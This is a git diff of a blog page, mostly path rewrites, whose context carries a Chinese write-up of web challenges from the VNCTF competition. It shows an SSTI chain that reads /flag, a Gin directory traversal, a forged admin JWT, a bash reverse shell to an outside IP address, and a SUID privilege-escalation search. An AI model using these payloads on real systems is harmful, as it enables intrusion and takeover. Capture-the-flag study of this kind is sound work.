@@ -8,8 +8,8 @@
 <head>
   <meta charset="UTF-8">
 
-  <link rel="apple-touch-icon" sizes="76x76" href="/tuyi/img/tuyi.jpg">
-  <link rel="icon" href="/tuyi/img/tuyi.jpg">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/tuyi.jpg">
+  <link rel="icon" href="/img/tuyi.jpg">
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
@@ -22,7 +22,7 @@
     <meta name="description" content="奶龙回家 输入1&#39;回显  但是输入1&#39;&#39;两个单引号  正常回显，说明存在sql注入 先fuzz一下  过滤了一点而且对大小写敏感，猜测是sqlite(也可能是正则），打时间盲注，那他过滤sleep干嘛，迷惑我们吗 既然猜测是sqlite那就使用randombolb函数试试 空格使用&#x2F;**&#x2F;过滤 尝试 1payload &#x3D; &quot;&#x27;OR&#x2F;**&#x2F;(case&#x2F;**">
 <meta property="og:type" content="article">
 <meta property="og:title" content="VNCTF-web">
-<meta property="og:url" content="https://blog.tuyiisxp.top/2025/02/11/VNCTF-web/index.html">
+<meta property="og:url" content="https://258369123.github.io/2025/02/11/VNCTF-web/index.html">
 <meta property="og:site_name" content="tuyi的小站">
 <meta property="og:description" content="奶龙回家 输入1&#39;回显  但是输入1&#39;&#39;两个单引号  正常回显，说明存在sql注入 先fuzz一下  过滤了一点而且对大小写敏感，猜测是sqlite(也可能是正则），打时间盲注，那他过滤sleep干嘛，迷惑我们吗 既然猜测是sqlite那就使用randombolb函数试试 空格使用&#x2F;**&#x2F;过滤 尝试 1payload &#x3D; &quot;&#x27;OR&#x2F;**&#x2F;(case&#x2F;**">
 <meta property="og:locale" content="zh_CN">
@@ -71,19 +71,19 @@
 <link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
 
 
-<link  rel="stylesheet" href="/tuyi/css/main.css" />
+<link  rel="stylesheet" href="/css/main.css" />
 
 
-  <link id="highlight-css" rel="stylesheet" href="/tuyi/css/highlight.css" />
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
   
-    <link id="highlight-css-dark" rel="stylesheet" href="/tuyi/css/highlight-dark.css" />
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
   
 
 
 
   
-<link rel="stylesheet" href="/tuyi/css/custom.css">
-<link rel="stylesheet" href="/tuyi/css/reward.css">
+<link rel="stylesheet" href="/css/custom.css">
+<link rel="stylesheet" href="/css/reward.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
 
 
@@ -91,15 +91,15 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"blog.tuyiisxp.top","root":"/tuyi/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/tuyi/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"258369123.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
       Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
   </script>
-  <script  src="/tuyi/js/utils.js" ></script>
-  <script  src="/tuyi/js/color-schema.js" ></script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
   
 
 
@@ -116,7 +116,7 @@
 <div class="header-inner" style="height: 70vh;">
   <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand" href="/tuyi/">
+    <a class="navbar-brand" href="/">
       <strong>tuyi的小站</strong>
     </a>
 
@@ -135,7 +135,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/tuyi/" target="_self">
+              <a class="nav-link" href="/" target="_self">
                 <i class="iconfont icon-home-fill"></i>
                 <span>首页</span>
               </a>
@@ -147,7 +147,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/tuyi/archives/" target="_self">
+              <a class="nav-link" href="/archives/" target="_self">
                 <i class="iconfont icon-archive-fill"></i>
                 <span>归档</span>
               </a>
@@ -159,7 +159,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/tuyi/categories/" target="_self">
+              <a class="nav-link" href="/categories/" target="_self">
                 <i class="iconfont icon-category-fill"></i>
                 <span>分类</span>
               </a>
@@ -171,7 +171,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/tuyi/tags/" target="_self">
+              <a class="nav-link" href="/tags/" target="_self">
                 <i class="iconfont icon-tags-fill"></i>
                 <span>标签</span>
               </a>
@@ -183,7 +183,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/tuyi/about/" target="_self">
+              <a class="nav-link" href="/about/" target="_self">
                 <i class="iconfont icon-user-fill"></i>
                 <span>关于</span>
               </a>
@@ -213,7 +213,7 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/tuyi/img/default.png') no-repeat center center; background-size: cover;">
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
@@ -304,12 +304,12 @@
               <div class="markdown-body">
                 
                 <h1 id="奶龙回家"><a href="#奶龙回家" class="headerlink" title="奶龙回家"></a>奶龙回家</h1><p> 输入<code>1&#39;</code>回显</p>
-<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250214130506725.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250214130506725"></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250214130506725.png" srcset="/img/loading.gif" lazyload alt="image-20250214130506725"></p>
 <p>但是输入<code>1&#39;&#39;</code>两个单引号</p>
-<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250214130543617.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250214130543617"></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250214130543617.png" srcset="/img/loading.gif" lazyload alt="image-20250214130543617"></p>
 <p>正常回显，说明存在sql注入</p>
 <p>先fuzz一下</p>
-<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250214131102161.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250214131102161"></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250214131102161.png" srcset="/img/loading.gif" lazyload alt="image-20250214131102161"></p>
 <p>过滤了一点而且对大小写敏感，猜测是<code>sqlite</code>(也可能是正则），打时间盲注，那他过滤sleep干嘛，迷惑我们吗</p>
 <p>既然猜测是<code>sqlite</code>那就使用<code>randombolb</code>函数试试</p>
 <p>空格使用<code>/**/</code>过滤</p>
@@ -326,12 +326,12 @@
 <p> Bottle 的模板引擎依赖于 Python 的表达式求值，但它并不是一个完整的 Python 解释器。在模板中，只有可直接求值的表达式才能通过 <code>&#123;&#123;...&#125;&#125;</code> 语法嵌入。因此，<code>a=5</code> 这样的赋值语法会导致语法错误，因为赋值本身并不是一个返回值的表达式，而是一个操作</p>
 <figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">a:</span>=<span class="hljs-number">5</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">a</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215171504250.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250215171504250"></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215171504250.png" srcset="/img/loading.gif" lazyload alt="image-20250215171504250"></p>
 <p>那么就可以写了</p>
 <p>payload：</p>
 <figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">a:</span>=<span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">b:</span>=a.__class__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">c:</span>=b.__base__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">d:</span>=c.__subclasses__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">e:</span>=d()[156]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">f:</span>=e.__init__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">g:</span>=f.__globals__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">z:</span>=<span class="hljs-string">&#x27;__builtins__&#x27;</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">h:</span>=g[z]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">i:</span>=h[&#x27;op&#x27;&#x27;en&#x27;]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x:</span>=i(<span class="hljs-name">&quot;/flag&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">y:</span>=x.read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215171805552.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250215171805552"></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215171805552.png" srcset="/img/loading.gif" lazyload alt="image-20250215171805552"></p>
 <h1 id="Gin"><a href="#Gin" class="headerlink" title="Gin"></a>Gin</h1><p>先看源码，发现再download路由存在目录穿越，没对输入进行处理</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">func Download(c *gin.Context) &#123;<br>	filename := c.DefaultQuery(<span class="hljs-string">&quot;filename&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>	<span class="hljs-keyword">if</span> filename == <span class="hljs-string">&quot;&quot;</span> &#123;<br>		response.Response(c, http.StatusBadRequest, <span class="hljs-number">400</span>, nil, <span class="hljs-string">&quot;Filename is required&quot;</span>)<br>	&#125;<br>	basepath := <span class="hljs-string">&quot;./uploads&quot;</span><br>	filepath, _ := url.JoinPath(basepath, filename)<br>	<span class="hljs-keyword">if</span> _, err := os.Stat(filepath); os.IsNotExist(err) &#123;<br>		response.Response(c, http.StatusBadRequest, <span class="hljs-number">404</span>, nil, <span class="hljs-string">&quot;File not found&quot;</span>)<br>	&#125;<br>	c.Header(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment; filename=&quot;</span>+filename)<br>	c.File(filepath)<br>&#125;<br></code></pre></td></tr></table></figure>
 
@@ -342,7 +342,7 @@
 <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GenerateKey</span><span class="hljs-params">()</span></span> <span class="hljs-type">string</span> &#123;<br>	rand.Seed(config.Year())<br>	randomNumber := rand.Intn(<span class="hljs-number">1000</span>)<br>	key := fmt.Sprintf(<span class="hljs-string">&quot;%03d%s&quot;</span>, randomNumber, config.Key())<br>	<span class="hljs-keyword">return</span> key<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>那我们就可以生成key</p>
-<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215172821196.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250215172821196"></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215172821196.png" srcset="/img/loading.gif" lazyload alt="image-20250215172821196"></p>
 <p>拿到key那就可以进行jwt伪造生成admin的token</p>
 <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">eyJhbGciOiJIUzI<span class="hljs-number">1</span>NiIsInR<span class="hljs-number">5</span>cCI<span class="hljs-number">6</span>IkpXVCJ<span class="hljs-number">9</span>.eyJ<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>VybmFtZSI<span class="hljs-number">6</span>ImFkbWluIiwiaXNzIjoiTWFzaDFyMCIsInN<span class="hljs-number">1</span>YiI<span class="hljs-number">6</span>InVzZXIgdG<span class="hljs-number">9</span>rZW<span class="hljs-number">4</span>iLCJleHAiOjE<span class="hljs-number">3</span>Mzk<span class="hljs-number">2</span>OTc<span class="hljs-number">3</span>NjQsImlhdCI<span class="hljs-number">6</span>MTczOTYxMTM<span class="hljs-number">2</span>NH<span class="hljs-number">0</span>.ARUWYZnXAJTR<span class="hljs-number">0</span>QmR-Vn<span class="hljs-number">4e49</span>HEPI<span class="hljs-number">1</span>o<span class="hljs-number">4</span>CpSvrxP<span class="hljs-number">3</span>NBVgM<br></code></pre></td></tr></table></figure>
 
@@ -355,7 +355,7 @@
 <p>反弹shell</p>
 <figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">bash -c &quot;bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">8.138.181.58</span>/<span class="hljs-number">32771 0</span>&gt;&amp;<span class="hljs-number">1</span>&quot;<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215174943757.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250215174943757"></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215174943757.png" srcset="/img/loading.gif" lazyload alt="image-20250215174943757"></p>
 <p>假的，看看有没有suid提权</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
 
@@ -366,7 +366,7 @@
 
 <p>发现我们的权限变成root</p>
 <p>再拿flag，不能用cat了</p>
-<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215175852729.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250215175852729"></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215175852729.png" srcset="/img/loading.gif" lazyload alt="image-20250215175852729"></p>
 
                 
               </div>
@@ -385,7 +385,7 @@
     
       <span class="category-chain">
         
-  <a href="/tuyi/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" class="category-chain-item">比赛复现</a>
+  <a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" class="category-chain-item">比赛复现</a>
   
   
 
@@ -400,11 +400,11 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tuyi/tags/sqlite%E6%B3%A8%E5%85%A5/" class="print-no-link">#sqlite注入</a>
+        <a href="/tags/sqlite%E6%B3%A8%E5%85%A5/" class="print-no-link">#sqlite注入</a>
       
-        <a href="/tuyi/tags/linux%E6%8F%90%E6%9D%83/" class="print-no-link">#linux提权</a>
+        <a href="/tags/linux%E6%8F%90%E6%9D%83/" class="print-no-link">#linux提权</a>
       
-        <a href="/tuyi/tags/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" class="print-no-link">#时间盲注</a>
+        <a href="/tags/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" class="print-no-link">#时间盲注</a>
       
     </div>
   
@@ -417,7 +417,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>VNCTF-web</div>
-      <div>https://blog.tuyiisxp.top/2025/02/11/VNCTF-web/</div>
+      <div>https://258369123.github.io/2025/02/11/VNCTF-web/</div>
     </div>
     <div class="license-meta">
       
@@ -466,7 +466,7 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/tuyi/2025/02/15/API%E4%B8%8Edeepseek/" title="API">
+                      <a href="/2025/02/15/API%E4%B8%8Edeepseek/" title="API">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">API</span>
                         <span class="visible-mobile">上一篇</span>
@@ -476,7 +476,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/tuyi/2025/02/09/n1ctf/" title="n1ctf">
+                      <a href="/2025/02/09/n1ctf/" title="n1ctf">
                         <span class="hidden-mobile">n1ctf</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
@@ -667,8 +667,8 @@
 
 <script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
 <script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/tuyi/js/events.js" ></script>
-<script  src="/tuyi/js/plugins.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
 
 
   <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
@@ -690,7 +690,7 @@
 
 
   
-    <script  src="/tuyi/js/img-lazyload.js" ></script>
+    <script  src="/js/img-lazyload.js" ></script>
   
 
 
@@ -789,7 +789,7 @@
 
   <script>Fluid.plugins.imageCaption();</script>
 
-  <script  src="/tuyi/js/local-search.js" ></script>
+  <script  src="/js/local-search.js" ></script>
 
   <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
@@ -799,13 +799,13 @@
   
 <script src="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
 <script src="//cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script>
-<script src="/tuyi/js/reward.js"></script>
+<script src="/js/reward.js"></script>
 
 
 
 <!-- 主题的启动项，将它保持在最底部 -->
 <!-- the boot of the theme, keep it at the bottom -->
-<script  src="/tuyi/js/boot.js" ></script>
+<script  src="/js/boot.js" ></script>
 
 
   
